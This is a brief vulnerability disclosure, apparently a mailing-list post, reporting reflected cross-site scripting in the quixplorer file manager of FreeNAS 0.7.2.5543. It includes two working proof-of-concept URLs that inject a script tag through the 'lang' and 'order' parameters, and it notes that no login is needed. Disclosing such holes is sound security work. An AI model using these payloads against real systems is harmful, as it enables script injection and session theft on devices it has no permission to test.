Good morning, you can xss freenas stable (0.7.2.5543)
like this

http://192.168.0.1/quixplorer/index.php?action=list&order=name&srt=yes&lang=en%22/%3E%3Cscript%3Ealert%281%29;%3C/script%3E

or this ...
http://192.168.0.1/quixplorer/index.php?action=list&order=nan%22/%3E%3Cscript%3Ealert%281%29;%3C/script%3Eme&srt=yes
etc.

This will work regardless of the user being logged into the quixplorer
module or freenas.
